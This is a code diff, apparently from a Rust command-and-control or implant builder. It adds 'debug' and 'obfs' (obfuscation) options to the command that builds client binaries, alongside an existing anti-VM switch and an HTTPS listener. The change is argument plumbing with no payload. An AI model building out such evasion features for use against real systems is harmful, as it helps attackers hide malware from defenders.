@@ -75,6 +75,12 @@ enum Commands {
 
         #[arg(long)]
         no_antivm: bool,
+
+        #[arg(long)]
+        debug: bool,
+
+        #[arg(long)]
+        obfs: bool,
     },
     Serve {
         #[arg(long, default_value = "127.0.0.1:8443")]
@@ -165,6 +171,8 @@ fn main() -> Result<()> {
             server_url,
             target,
             no_antivm,
+            debug: debug_build,
+            obfs,
         } => {
             require_operator(&conn)?;
             let ca = ca::load_ca(&meta.ca_cert_pem, &meta.ca_key_pem)?;
@@ -179,9 +187,10 @@ fn main() -> Result<()> {
                 &cli.data_dir,
                 target.as_deref(),
                 no_antivm,
-                false,
+                debug_build,
+                obfs,
             )?;
-            tracing::info!(build_id = %out.build_id, uid = %uid, no_antivm, "client build created");
+            tracing::info!(build_id = %out.build_id, uid = %uid, no_antivm, debug_build, obfs, "client build created");
             println!("build id:       {}", out.build_id);
             println!("client binary:  {}", out.client_binary.display());
             println!("encrypted file: {}", out.artifact_path.display());
@@ -296,7 +305,7 @@ fn run_console(conn: Connection, meta: db::Meta, data_dir: &PathBuf) -> Result<(
                 }
                 let args = if parts[0] == "client" { &parts[2..] } else { &parts[1..] };
                 match parse_console_build_args(args) {
-                    Ok((artifact, uid, server_url, target, no_antivm, debug)) => {
+                    Ok((artifact, uid, server_url, target, no_antivm, debug_build, obfs)) => {
                         let uid = uid.unwrap_or_else(|| Uuid::new_v4().to_string());
                         let result = orchestrator::new_build(
                             &conn,
@@ -309,7 +318,8 @@ fn run_console(conn: Connection, meta: db::Meta, data_dir: &PathBuf) -> Result<(
                             data_dir,
                             target.as_deref(),
                             no_antivm,
-                            debug,
+                            debug_build,
+                            obfs,
                         );
                         let out = match result {
                             Ok(out) => out,
@@ -321,7 +331,7 @@ fn run_console(conn: Connection, meta: db::Meta, data_dir: &PathBuf) -> Result<(
                             Err(error) => return Err(error),
                         };
                         selected_build = Some(out.build_id.clone());
-                        tracing::info!(build_id = %out.build_id, uid = %uid, no_antivm, "client build created from console");
+                        tracing::info!(build_id = %out.build_id, uid = %uid, no_antivm, debug_build, obfs, "client build created from console");
                         println!("build id:       {}", out.build_id);
                         println!("client binary:  {}", out.client_binary.display());
                         println!("encrypted file: {}", out.artifact_path.display());
@@ -362,20 +372,21 @@ fn print_console_help() {
     println!("  diagnostics [build-id]                list encrypted diagnostics");
     println!("  listen [addr] [san ...]               start the HTTPS listener");
     println!("  client create --artifact <file> [--uid <id>] [options]");
-    println!("       --server-url <url> --target <triple> --no-antivm --debug");
+    println!("       --server-url <url> --target <triple> --no-antivm --debug --obfs");
     println!("  clear                                 clear the terminal");
     println!("  exit                                  leave the console");
 }
 
 fn parse_console_build_args(
     args: &[&str],
-) -> Result<(PathBuf, Option<String>, String, Option<String>, bool, bool), String> {
+) -> Result<(PathBuf, Option<String>, String, Option<String>, bool, bool, bool), String> {
     let mut artifact = None;
     let mut uid = None;
     let mut server_url = "https://127.0.0.1:8443".to_string();
     let mut target = None;
     let mut no_antivm = false;
     let mut debug = false;
+    let mut obfs = false;
     let mut index = 0;
     while index < args.len() {
         match args[index] {
@@ -399,12 +410,13 @@ fn parse_console_build_args(
             }
             "--no-antivm" => no_antivm = true,
             "--debug" => debug = true,
+            "--obfs" => obfs = true,
             flag => return Err(format!("unknown option '{flag}'")),
         }
         index += 1;
     }
     let artifact = artifact.ok_or("missing --artifact <file>".to_string())?;
-    Ok((artifact, uid, server_url, target, no_antivm, debug))
+    Ok((artifact, uid, server_url, target, no_antivm, debug, obfs))
 }
 
 fn init_logging(data_dir: &PathBuf) -> Result<tracing_appender::non_blocking::WorkerGuard> {
